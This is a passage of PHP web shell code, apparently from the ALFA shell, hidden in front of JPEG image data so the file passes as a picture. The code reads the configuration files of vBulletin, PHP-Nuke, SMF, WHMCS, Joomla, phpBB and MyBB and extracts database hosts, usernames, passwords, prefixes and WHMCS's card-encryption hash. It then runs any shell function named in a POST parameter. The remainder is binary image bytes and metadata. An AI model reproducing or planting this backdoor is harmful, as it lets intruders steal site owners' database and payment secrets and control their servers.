'dbname'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")dbname(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'dbpw'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'prefix'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")tableprefix(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3)
),
'phpnuke'=>array('file'=>'/config.php',
'host'=>array('/dbhost(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbname'=>array('/dbname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbuser'=>array('/dbuname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbpw'=>array('/dbpass(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'prefix'=>array('/prefix(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3)
),
'smf'=>array('file'=>'/Settings.php',
'host'=>array("/db_server(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/db_user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/db_passwd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/db_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'whmcs'=>array('file'=>'/configuration.php',
'host'=>array("/db_host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/db_username(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/db_password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'cc_encryption_hash'=>array("/cc_encryption_hash(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'joomla'=>array('file'=>'/configuration.php',
'host'=>array("/\\\$host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/\\\$db(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/\\\$user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/\\\$password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/\\\$dbprefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'phpbb'=>array('file'=>'/config.php',
'host'=>array("/dbhost(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/dbname(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/dbuser(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/dbpasswd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/table_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'mybb'=>array('file'=>'/inc/config.php',
'host'=>array("/config\['database'\]\['hostname'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/config\['database'\]\['database'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/config\['database'\]\['username'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/config\['database'\]\['password'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/config\['database'\]\['table_prefix'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
)
);
if($cms == "drupal"){
	$file = $config[$cms]['file'];
	$file=$path.$file;
	if(@is_file($file)||_alfa_is_dir($file,"-e")){
	}else{
		$cms = 'drupal2';
	}
}
if($cms == "vb"){
	$file = $config[$cms]['file'];
	$file=$path.$file;
	if(@is_file($file)||_alfa_is_dir($file,"-e")){
	}else{
		$path .= '/core';
	}
}
$data = array();
$srch_host = $config[$cms]['host'][0];
$srch_user = $config[$cms]['dbuser'][0];
$srch_name = $config[$cms]['dbname'][0];
$srch_pw = $config[$cms]['dbpw'][0];
$prefix = $config[$cms]['prefix'][0];
$file = $config[$cms]['file'];
$chost = $config[$cms]['host'][1];
$cuser = $config[$cms]['dbuser'][1];
$cname = $config[$cms]['dbname'][1];
$cpw = $config[$cms]['dbpw'][1];
$cprefix = $config[$cms]['prefix'][1];
if(@is_dir($path)||_alfa_is_dir($path)){
$file=$path.$file;
}elseif(@is_file($path)||_alfa_is_dir($path,"-e")){
$file=$path;
}else{
return false;
}
$file = __read_file($file);
if($cms == "drupal2"){
	$file = preg_replace("/\@code(.*?)\@endcode/s", "", $file);
}elseif($cms == "vb"){
	$file = preg_replace("/right of the(.*?)BAD!/s", "", $file);
}
if(preg_match($srch_host, $file, $mach)){
$data['host'] = $mach[$chost];
}
if(preg_match($srch_user, $file, $mach)){
$data['user'] = $mach[$cuser];
}
if(preg_match($srch_name, $file, $mach)){
$data['dbname'] = $mach[$cname];
}
if(preg_match($srch_pw, $file, $mach)){
$data['password'] = $mach[$cpw];
}
if(isset($prefix)){
if(preg_match($prefix, $file, $mach)){
$data['prefix'] = $mach[$cprefix];
}
}
if($cms=='whmcs'){
if(preg_match($config[$cms]['cc_encryption_hash'][0], $file, $mach)){
$data['cc_encryption_hash'] = $mach[3];
}
}
echo json_encode($data);
}
if(empty($_POST['a']))
if(isset($default_action) && function_exists('alfa' . $default_action))
$_POST['a'] = $default_action;
else
$_POST['a'] = 'FilesMan2';//'FilesMan';
if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
call_user_func('alfa' . $_POST['a']);
exit;
__halt_compiler();
���� JFIF  H H  ��$Exif  II*                b       j   (       1 
   r   2    �   i�    �   �   H      H      GIMP 2.10.20  2020:10:01 13:38:27   �    0221�       �    �  �    �                   �       0                           6      �"         ���� JFIF      �� C 		

 $.' ",#(7),01444'9=82<.342�� C			

2!!22222222222222222222222222222222222222222222222222��  � " ��           	
�� �   } !1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        	
�� �  w !1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? ��T�)�*eZ�ǪՄJb-J�Gmn�L�cA����>'�ƍ���b�_�!�>��yHfl�O5��=m��K���#b_oS�k��h�MtAY"0�8�GSS��+' ���@8�R�w�X�x<��d=�GJǀn��l
La$bX�6pz��>���!O�ȫ��� 2�f�?*� y~��օ������9������*šɌ�����F��J9��C�WE NN�KLc��G��ZJ�$>Q�/�}
,v�H\
���`4�":�gl.�1o
�|��}*ݮ��s��?�=~���[Y�u6v��R!H�ӟzmŞ�ؓ21W ���_�� ������LT7:���}��:d�b�gR`�j�t��'��x�0�������;��ƢcZ�^�#U���р.q�'�U��-	�[���R�U}��m|��i�#�@Ef��a�c�Grj�Cc	��+X��u9'����L���!b���A��Ek�[$22pA��\Q��d�ҕ�ML�M���as��F���� #c��I��5�*���ZG�X�]���=�-NqEN��b-Z�+�#J�s��f�ʷ�Fs1�݇�]o�uU�4inF<�6D����^9$�,��ŝ�f'�ִ��-��OJr��|�[�AR֣(���i�p��@��[���+T6I��,��O��V�m��pA�)1�aҝQ����f����ηM$j�#.2:?�ƪs�*9�X�a�:��v9��_�q�'l���Uc����Τr�H�k���ƣ�)������Vxs�8}�m���s�������*9��7Z��|#B�������먭V=Y�>!�������?JLy�7R} Z��У ��YH� ��7��EZ��]i�x�m+|�VTäY)�h��ՅuO�pA��(���*�k��<�=�?��$i�a�������)Y�9�3��?t���E-�Yԩ'��B��=�E2[��'q��}=I�)��]5�kdD���M���;���r�QLAEPJ;�R��YWW�%�u�'Ɋ�/5��L���� �"���(ޔ��Xl~�S�1cJ�Tq%3V�]/G��lf4%}�j� <�ǚ���>�f_�����W$3���Rʒ܉e�y��}���L�ea�^ ��F*xp7Hy3�Sژ�&���rƐ�*6fi�08�sؚ"9���v�1�q�U�}���e��%F�aW/X�<n:�������rJ05�x%���SёO�����q��vӯ��u�5�x7Q��\�!������0����ßQy_���h���π
(��
�ծ��Vҡ[�RH�e�~up2FG8�[5��N�$����g���I�cszg=K.�����i.�f�[[X�$RX!fl)�〭����T�61�m���BA#�
�iR˨j�O�Ey
B��UP�x�cV"ӎ�G��ͪ�0���cw�Β���4��?��[����
Bj%Âr�B�{�׷i^�ጁ��|��N>n{��j��-����&�.<�iWq��'�![x���M"g%m?�b�H#�~���H�0g�� ��bs������v�H�Jeŝ�څ���`� H���#@������ұ3�����������EPJ9 RQޓWV*咗a��]��G� ��Tww*F���I�0��֊�3˖���H�����=������W��o�����H���^�f��V�� �
Ʈ��
���ac�Z���?�r5�v��Nr}��[�]���� ^���޶��_�j�}�2	�~�O�+�+���}n��؉�}~�<V;p����F��>0���#
��\��#�5�%wcI���(�������ugT���x*�MT�����y��������˸i|�(�~�� ��n�H���~�|��?F����[�~�_��U[s��2O�]ҧ6�͔��dɟ�FkX;I3�z�t� #ܨ���O���bh˟�3�S؀�����+��ɩ�kOD��*�r2�>� ��>�Զi&�ݎ����U�K}N�y38�NdU@v���V��_��|ǚ7i�>U��G�́����� _y�HYA ����l��:{�3y�;�Y�%nF��g�zb���;iW��v��b{�m�`�q� ~ts�%��k�t�"i�;��\�N3��
�u{ �<��ǐ��P}:ȵInn�9�����2a)P�0l���R�h�l��[�.g���@�G�J�ӂ�� Z� �v}r����`�D�Ā:� �*�}�[� .љ���Ͼ>�hs��=��ǵ�t�rw"ɽGׅjMH�����L��.0���G�4�-� ����<����Q i7��C����YQj�Ӧ�'��.oZ �s�q�����_��6M���s�昚=�EcF"�~�,x�o>�QfJ����˸mN�-Jy#���p��$����5�Ƃ8�bc,I?��)4r%�X�w�Z�	�	=����[�6��ň��N)��M$���*������ӏC�Skµ�י�D%�N��5Ey��?j��
7!
�s^���{����^��I�~D쵔MN�G��?��?��G�u� ���$��[��Nk��v�'�"�?ۉ5w�� �+pՏ� X�
QPu�Q]炙Yn}��sQY�֊�����Z���4�2�����}�P������&�O�-����n	h�I@�;Q�W�M���Bيb��Ew~��VV�#�涙}0k����+K��<Q�߇
���� �P�e"�oL$�����-�����}�h��GV�����-5d��2�>����
�Q��L���^�r����տ魦j%FvQ��WA�'��9����
���}
v��0P�q���qu��\�,J� ��V7�]��vk"��51����"�k߃�S?0�O�Ք;6�n�76��$1��Sx##��V�cc�32C�Kc$���Ć}�ey�5�z�|�X�n��
�Z��A@c���79,r�!��8�">S�lW��ϥFmf�"�NIݸ��(�-�J��9=x�w�*&�K����2�[Y��9�ZFh�K(�*��Ќ�l���{T�� �|�A�s�(J�)_vF��&�C�\t��R��l�qی�=zT�T||��N)�@ (ԛĢ���m��A  �9�}��,�٫�Qa�.�h��Ѵ��� a��Moz�2Jzq��ֵ��M�������_W
Wj��XʪSPG�K.������%��b)���0^p ���j�1bX�$���[X��
(���� �M���^-Ej�^g�8)sai��5/�\��#6�Ή�c���n��:�WPO��:��qd����7�A��4wX�~!���I�E�o0����W�KA<�����X{���{���< D"�͕�qϙ�`~���.X��%�ħ˜,ˁمi�FE�m�E� l� �ֻ/
���B����$t9�O�q�l�)��	�A�Q>�iy�-���J���Eg��֊����wqk,X�,n����:��B��O�xg�0���1#׏j�H�:S�FEa��E:���
���^9a�k��NWftէ̮�<�}��v�t~�^#En�yg����K�b����cهQSJ$�!����X�� ��V�NUx��<M�ͫY����c�U�
����zܾ��\� ��I���� �zV�x��|7+������oxe5%7V�%Ҏ}{���%9��Kc�����h���k$֥�E��B�G�kW	���Ro�&c�6���z��Ww_E��Q��q\mO7�P��+s�
(��
(��
(�B
K�S�oR�9��$셥PY����J��Bc#��D���p�z�����e���r�c�y5�4��S�Wo$%�_�����i$����A�Nl���ю���QE�|�QE ���i��<}�Lk��+U��yL��T��9�y�~b�S)��?����*U5�z�f�n��P�Ȼ�z�Eq^=��	l�DE#e1A�r?L�U�)�����z�̊<�������1B��S��GZ�c�mGB�xm�Z��@!���Z���\��R��4g�#��~�����*2qwE�ox�G����Aq
�fH�>W�N���������C��T�c���r��4�H� 8$|�3��s�ᗺ��y4��-�U9�p,��VJ�:�of�}�H;t=�N�H�S�&T8;�?�sR�h�7��!
�`:pEA��렣Z���k�ƎrS�>��W���;"��{Yح�I��� 1S����R)x�A �2i��V�o>�h�rTuI'�� �ҽ��d\�����$�%V(c$H����^3�x�U��6V��c[[]�7�݂p�3^�_C���Y�?>�X���Ǫ���  (���>x(��\�4R�#��Xgo_Z��q�ҹ�*j��\���$���4בUF����j&�W`Za�L/O֐Z��i��Ѐ�b����h�Az��	O'��V���_��� �a��y�T;s��=�~>�)��9���q�P��� :�^C��.y�6{q���ya{y!Y��E��$Fjծ����2c �4�]:;�	m�TrC}Οi�H�	Ջ��a�̨�g�S���h�_V
v�[$ƴ�lc���GP5�(����	�-ʄE�vp3�_I��xG���W�O��k��Tu�7w���'��+��B�(�t�t�N$�l+1�E5H�H���+�S�29s`������:�/�� �&�I� ����FB���#� p� :�q���*Խ��6x��>3�L�D�q
�X/�[����FD/�� T�j���K��
�@x�7���as��޶����F��<�2`�13�П�c�t�t
�I<1���)�s��¸2ym�(6���rFB���d�g���L��v�J�Н��=3��i-�c1��J�����:��9�o��"���A���կ��I츈�NT��q]�2	��U�:���l�ް}�Q�`׷��rn��,¨h�k�� �,�E�^�g�W?L��U���zLR1�Rc�����=G�U�FԔ�*͌}ʎ�ɩ��U٥R�QS��o��̍�c8�S�Y�H�v��'$��B\8Q�GQ��v.�z�9���z��ᣅ���� �G' R0dGf��Oo���y��9gPrk��-��0����QC4r���jZi��"QqvaES��6�c��xi6��ҎK	#T�N.c��� ��^n2+�?#�z_���/[����ʥG��$���a�h޼�}�T���q�6�)������ 2^&�+�85�E�+��;o��V���B�<~��)�g�$P%0� �����k}g
<�.B�u'���G�[0�%9��8�k������Ѻ����*�R�����b�8���*��³�� 0
�o�,*!
�〣 T᫄�Q�A����8��R#1֎�q����|�>*ƞ�o$L����<� �B���r�^g�Đ��|��� ~��Q_F~l�u{5��I;����L1F͹�R}H�,m
�b�
���2�N���S�O�0��~�1A
��
[�߯�t� 0 ږ�Z�~ڧ;�Y�3�q���B��Z�q�0�P��θU�Tr~�P����⧴�d8eyb%��~��g���'=�j�J͹��{
Jޔ9"��c�/^U:t�(߬�}c2&1��+-'rq��۞]5���:x�Ϋ�W=����TU4��c3EӾ�m&�"Y�gӵi�eƳ����S�9��qP�|
���� ����x<,/��ξY�c��L��k��u6i������4�m[m��-�0+kK�#��7#'��f���=l7�$߷|��V,a�Ub ��q�l���	�>��9>�`\@x���B��F� y��5�[�m����R�)%+����*?5T7�nk+F�o�O���F'���!��6���`�s�z�z�k��{�9��ɴ�Y����İo�>���]Bk��F���Ȯfžv��xu�G�+Il4v33@D��l2� ��jxnQ��uS�U[���>��PO�{��q�2��U��Nm#\H7m�8�9dV��=
P����@���WK�U6F���cc�;�L���c����	+��?�USxPI8�����.�� V����j�MӚ��c���eF[IX�|��v�})�f��g�F����r��Ez�̻��*�.��O��3i�+��p���ַ����Ҩ��r�����W�[�&;,��jS�O���|�94(T����Kg��D�d\n����n ��e�&�uA�'��+F����|˖�z5m�XѱU��30��
�<��$���B���d�+%�s\�W����{1��`����O�ch�R��n����k��V����"x��23�L�7ou�z�*0\�=iF�Ժ�
mSwG-��ۻ���tyʜW����i����u}q�8e������x��H/� �`~d���x3S��_�B�f�m+�r�H��}k���j���^� T��.�I��u�Ų
�~����.����q�<o��9C�A��s�� �=Mj�-����Qp����p�zV���6��^.T}�S�~��L��EEa�g#�_�"�1�w<t7�nj �R�s]'/��6�*�=J��氼G �����D����Z۪��y�O������kpG`߼��tz�X��w��k��muF*
��ej��s��>�Ս��u���ڭ,���� j`�N>bxO�����r�]Mb��=hI$������>�^6!q�Ҽ���?�?�ް��n�e�m�7�����O�]
T�a�=h�Xc� d>���CF��زI&�b�r��+,x�y"�n��K�� d,���J��&�%b����$�T*P�,����ʭ��V����[+&ߛ��Z�Λd� X�z[�2>��"`���;�����wt��/iK�3��:���}�������"��};ֶ��s�x�V�����	�Lr���nn��m��q�V_�u�C�����X��e8o�}c4��ً<��f<�q���<��w��b0E  ���0����9&޺=�C*ҫR
Eh��u�Z(��O*Wh�(�X09,MEE+��iu2�G,���i�� g�?Ҽ�Tҵզ]>�S4w;�tpz��+���Zk"����Z��&��H.U�n��T��b�
x�Ji٥�>�*���м�2ow���]\Ig�����59���wM�[��.rW�@�T�-�;�Ҟ��~�~��m���v�������-�C�[����áW�󩣎��4S�a *1��SEu�1ȧ�<Թ�����,�y����8�(�&����
!��re�/%\,�S���y'��Қ9
Z!�(���^р}R%<�#�j 5x\���� �M����G�o�Zt�۹ٱ�Y84�ˌ�q�������0��ϗ�+�/�=�+�����Yy�	�:	�	 _�
��<*�����p��6��A�I'���
˥"v����Ն8���έ�8�n1���ck����8l��U���!���#ӢX��W�HK�b�Ծ'c���O���hײ��[T1�`=j��u���]�p"��c
��j�L�ʱ�����ϡ�T&���f5��K��t}
{��! �����nйo��� �R�J��%R1�j��ef�z
�!��4�������Ti?}�� _���/"�vʳE����=}
_''4�U�0Ҕ�F�<L^e���0����jQEv!EP��L�?�?S����E�m�!,~A���f��6�d�H[v>\UuY�"��b!Q�'� ���u���Ŋ�]N{W��`�הz�e���B��ߖ���l�U�� �V��� ���a�?�%��V���.��1W�h�GV��5��i�<Xp4Q]G�4�h���B>�� �E�с�d�$�͸���C� 4� t�EZ�gVؘ����2�OJ(�V@c�ڧ ����?�[�c����袹繽"�jxcE��*H�r���V��nc� ����\�E Z�Y��5?N*�ľm��r6�q�h��d�h��,�TH8^� �������R��~]��:����ٵ��QZ��EP%$D�1�]�ч�p6�;�E!�'�A�'q��:����^Xf�e!0H��QE&h��$���9#zU{����'b}�h�����*NMj�o"�U�.4�/v[��5��O�Eu�$�@l�9Ƕk���aH^@����ǹ���C拾?�� ���http://ns.adobe.com/xap/1.0/ <?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?> <x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="XMP Core 4.4.0-Exiv2"> <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:iptcExt="http://iptc.org/std/Iptc4xmpExt/2008-02-29/" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stEvt="http://ns.adobe.com/xap/1.0/sType/ResourceEvent#" xmlns:plus="http://ns.useplus.org/ldf/xmp/1.0/" xmlns:GIMP="http://www.gimp.org/xmp/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmpMM:DocumentID="adobe:docid:photoshop:dbe49595-e7ab-11e9-aac6-e78321a644ac" xmpMM:InstanceID="xmp.iid:83ec1e32-53ef-402b-b774-4a59c4bc9c4a" xmpMM:OriginalDocumentID="608A198E77F1952747C747FC294D83B0" GIMP:API="2.0" GIMP:Platform="Windows" GIMP:TimeStamp="1601584707396225" GIMP:Version="2.10.20" dc:Format="image/jpeg" photoshop:ColorMode="3" xmp:CreateDate="2019-10-05T21:35:01+02:00" xmp:CreatorTool="GIMP 2.10" xmp:MetadataDate="2019-10-05T22:11:34+02:00" xmp:ModifyDate="2019-10-05T22:11:34+02:00"> <iptcExt:LocationCreated> <rdf:Bag/> </iptcExt:LocationCreated> <iptcExt:LocationShown> <rdf:Bag/> </iptcExt:LocationShown> <iptcExt:ArtworkOrObject> <rdf:Bag/> </iptcExt:ArtworkOrObject> <iptcExt:RegistryId> <rdf:Bag/> </iptcExt:RegistryId> <xmpMM:History> <rdf:Seq> <rdf:li stEvt:action="saved" stEvt:changed="/" stEvt:instanceID="xmp.iid:84ad25dd-b290-524e-849f-0039929c5d2b" stEvt:softwareAgent="Adobe Photoshop CC 2017 (Windows)" stEvt:when="2019-10-05T22:11:34+02:00"/> <rdf:li stEvt:action="saved" stEvt:changed="/" stEvt:instanceID="xmp.iid:465020ed-0b31-a846-b79b-62b3e19afd7a" stEvt:softwareAgent="Adobe Photoshop CC 2017 (Windows)" stEvt:when="2019-10-05T22:11:34+02:00"/> <rdf:li stEvt:action="saved" stEvt:changed="/" stEvt:instanceID="xmp.iid:d6e21730-9f80-452b-8458-da45fc8f5e0f" stEvt:softwareAgent="Gimp 2.10 (Windows)" stEvt:when="2020-10-01T11:10:20"/> <rdf:li stEvt:action="saved" stEvt:changed="/" stEvt:instanceID="xmp.iid:83c86182-295c-40b3-8912-0f23f8231020" stEvt:softwareAgent="Gimp 2.10 (Windows)" stEvt:when="2020-10-01T13:38:27"/> </rdf:Seq> </xmpMM:History> <plus:ImageSupplier> <rdf:Seq/> </plus:ImageSupplier> <plus:ImageCreator> <rdf:Seq/> </plus:ImageCreator> <plus:CopyrightOwner> <rdf:Seq/> </plus:CopyrightOwner> <plus:Licensor> <rdf:Seq/> </plus:Licensor> </rdf:Description> </rdf:RDF> </x:xmpmeta>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <?xpacket end="w"?>���ICC_PROFILE   �lcms0  mntrRGB XYZ � 
   " acspMSFT                          ��     �-lcms                                               
desc      @cprt  `   6wtpt  �   chad  �   ,rXYZ  �   bXYZ  �   gXYZ      rTRC      gTRC      bTRC      chrm  4   $dmnd  X   $dmdd  |   $mluc          enUS   $    G I M P   b u i l t - i n   s R G Bmluc          enUS       P u b l i c   D o m a i n  XYZ       ��     �-sf32     B  ����%  �  ����������  �  �nXYZ       o�  8�  �XYZ       $�  �  ��XYZ       b�  ��  �para        ff  �  
Y  �  
[chrm         ��  T|  L�  ��  &g  \mluc          enUS       G I M Pmluc          enUS       s R G B�� >Photoshop 3.0 8BIM     !7 	2020-10-1< 13:38:27-13:38 �� C �� C�� �� ��              	
��            	��    �'r���ŵB��u�ܨ\�Q
�{j�z�$��k�u)T��x?>~(��i
	蘅��״�K�Z���r:��U���V��עڮ��LL�U��sV��0e��a]�5�[���F��ui��.�j{5g4Q�
�� ��  U �*ҙ��R�2�@j!D�  br�Mk��9=�)n�$<�]oJ�Òd$[�Y���!@�@�U��f�-�m��#~�u�V�k���[�f%ĭe/Z�r�a�� 3���}_���4�*�����$s{	��V+�W++���\!]:��v�ɤ���V]A��]�Ь�\�ݦR��I������!]��nFҴ)^�bt+MrI+L�%���'N*����qզ6��%MV�-eg%[�k<-ce\���j�ܕ+
�"NP .'" &&��j�!�����h 1O  &�4g�Ei~b�\�%�\|����!�ܺ��_
n�j�	�Ea4��L�)곻n��呎����߹��u���Vs(�l�oY�vŌ�yg���zOU��]
��b�\�y?��	��r�K���cX�UZ��Q�D��Y�.$�%�aZ�����V�~[moy�gL
��u�ԄҢi�E�Mv������2���Jʴ�F�kD�PN�URuDK)�\�4����G)J�r���LŮ�	�I�'" ��� ��[H�n���� F(�h��$�].���wq�F5�F����/ǼZ�v���X�wc���ԭboX4T���ui$���nQ#U�Yۦ[f;"y^gA�M�}�;�qUV	�K��oeb���ͦ��o�>���o�P��X�ڪ瓹�����S"�Tj�TV�������7&.P���Ud��k�u5�W4����[�����U��jBiQF.Kq�%*�R$�6�ܭ�8ĺ��[u��X�U��V*̔��bR����N֯~;Wԭ�+����=��JV q1  LL�is{��΢5  �� jWؘ�:q�־{�o�B^Rʵ��=������Y8�z���gg[��؅�Q��Ԋe�H�U�S�D�,5��x�}Y�tiG��Y�N9��9�����1����X��o�[O�h�W�{{��r���E�&r��0T�Z�u-+��H֪Uԯn��r��wqP�[����uR�>=��ö�D+J�ckf�M���U�Y�I�Z���9^�:��bb`L���%HF��1��F����JiףʮBޭƴ�Z�v[�ۭBpP .* 10'��lӕ^���Y�I�H$�x����1�q��"���y�P�n��w�ۡ������vb�hĔ���8��m�()MJ5��W)j5]/o�r'�wl�{u�ᗣ�[��q���I��E�.�
�#��G+Ux�F�z.O��7�����5c5�E�&�y�V�Z�w�&*܌�ku�N*�!r�z��y(�V5j���o5�K�n�;l�&�����M���0��UcY�L��¶u�H���Y�:��QpD�*B5b����J4��;E9��|��v�V��-��xwr	D�0@{� ����#m��r��VPL!V�jV)nQ��[X�S"��l_��-.O/eY�&[�������)��W������c��JW��V�q�Ƚ������]����|վÖ���zf��nxˏ�S��� �U�����<��Z�s���a�rޝǹ�ݹ*�-���U�*E^��X�mT���*�TR���⪗h]]�[t���>In�y�d&\��i��6�M;hҠcY�k� 6K�ڔAP���R�P�Ĥ�i��ͺm3��܇-�
�m��on=��I4�P`D�"N. [O6�n����V��A���/h�nj�)�1�h����lj�t�N��#/?^�J�&�t.Nʮ��sc�ڻ�J�������
�#���9�{��/��E�Õ���    �˿�Eڲ��rח�|��!
��J�*\�*.yg�̸�|�RluR��
�Je.�R�j�W�.����4��'72�y�%����V�z;�%Vy�F�&�&����m��ې*Μ�m�z�@	Ȃq`�y�N�jx9S�e[�����ۧaƽ��� NP D\N���m��<�=�Z��O[�N�jx(�e��Ql�U�x��Z��8��j%�*bl��،�yj�)wc���g��a��q�Gi�a�\N?c������      �� Sr:���8:��W��>��7Um�z�U�1r��K���MeX�+�
��#^��\�7h�IZ3��>mmk�m�D� j�)�+T�+<��I��ؚ���&&M���XTAgN$H%HF��&)���b���j��)�oCU��%��ܿ��'�
�$���PLM[c9j�W�?<d���W;����p�m]���E�M��YBVɳjm����5ϭ�7�w�wz�棲䱛N2�g�gv�U�Õ�{Z         &��[�cׯob�/m���{p�),�by�~c>�[!1ST�J�S�w�\M]��F�̭�N^Xλ�Cqj����Ι��)Y��Y�nh�Oql�,�.& t�S�!X�P�:b%IR���8*���r����Ka�y��z����X�n
����q10S��S
ZXV9�K�a�����lm�S��z�+VZT�V�L�>/;��o1���a����y<�×�l�
�ZP           �����:��-	��nf�������fU�3��}¡SP��+�u+Z��#uq^��+���U�]#&�ǽ��99*Z)��Br"⢥��-�鶜t�@��rc�Y��� �P� �IT11LNPS�ܷ��w�s�Wa�N��U�o��+�Ը�!J1���
����X��S����O��{��]^ť��q�<�7a�c6�;c�����~Õ�g��\�               �7ٷ�a���F*��~��o�
N�ZԌ�8�YD�/?�^��*�˄�%UK�.亢�is(]�C���\DH���B�$��ef[\��0�vU�mqP��,�=��sE@�P�	��cRU ND�������'�o3/�k��;u���ׯb6:��΍H��[ݩ>�WHB�a���r�͇-e��Xl9,~w1��s��V�/@                  |����5�NG'hZ�Y�ͯe�۫$eRyVc��dJ�b�]:��uW��+�.+n�՗�s+�;yY�ݚ�B�r�,+qD�����������=J��ZI19�,\��akL�+T+�+)P7)R�D䅴#��([�f���k�]��	[U��-�����Cq�m�~2�o+m��P�rv���Ô���!<p                     #�{�|�_-��<\�/W��h��[/O8F���O/��U.�N�W(�)q%yR�5�����mbr���OU�rj�Rbs*RW= *����z�k��q��� ���.^�k�v2�
���Ԩ![֘$l����-J�]�Ժl+�Y��:�ϓ�6�nog���r7N.�k����j�                        h}_�� P���V��v��M�Jܤ��(l�6��Z��F����w�m�U{ZԌ�m�i㭬夀M*�w�R�bb$���V%pZ�~�����lP�ݢS	V�P�^ܺ=�u�uߨ�{S���;ۍ�l�뭷	c��3�N;+���X                           	�w~^�r��ǯzƓ{_Sq��1�	�;p���_2�\�\��[���WW0�t]ֵ�^;v_z)��-�j"T03��h�p
��&15�s#8LL	ʦ��s!�v;E�^�&��U\�8#�侊�>�7~_[i����J�                              |���}o:�'Y�5
��1�a�)�n5�1�_2�\'p��W�.U����V��V�����3�!�kK��SM��ԧ*
����է���vؘ�[V�q2w�l��z����2��Ja�3�T��'O�� S=[�                   �8������P����G�          /���z@�ec�o���|��,�3���U�8���T�+v��iq%��ׂꫛ�.<dC�~���<�x�R�.�=
�cY��b`D��ΛEk2�NF���d��-곕�)�ٔ	��ަ�n��K�9�� �ߛ�              +&  F��q�}
�-��}Ϛ�c�����_w�          C�?G.9?l�\á�c��U��LO;u�sΜ�e�u��ܣu%�{Kuj��n*���Ͻ�ɳ��*�j���	Nj��jW �� 	��ft�!U�@	�lSS�cdUWU�1Rtlz�ίǠە�JKL�����ˋ�Z              4}��9�;�1��'`  ������~�t�&'���g:          �o����y1̷��h�{�5k/>r���:�]!v^V�5�ԭ�V���X\�nUϒ}*�]r��B�T�"t�V5�X�� 
��i!^��*K�5!�Q��ۮ�*j��W��T$ɏOƕ��.^���~j���`         
�=���'��^�x�G�~0����n��� �_3��7�  �cn3^Q����� �{��           �_a<�윍�K���7Z:7uj]������|�ҽ��R�K�����ݹ�o\��M��!�A,ڼ���SŪ\��nS�* �J�F���6hVb �p&%1U�}ûsF
T�i�,�#D�N-~;���Ш�J�H���o�mx         g�.9/��g����צ|=V��ޓ�>qr�����>7 ��O�/9�7�ס�s�Ǚ��/��7�ߟ�7�W��ԭώk�>rr���"�߆�           <��z~#��S#���=���7Yh�3�3.p^_>����ܗ2]Iu[ws�swy�*�ȝ��y���rԭ�k)�J;-�ND�ND��+�����jS��
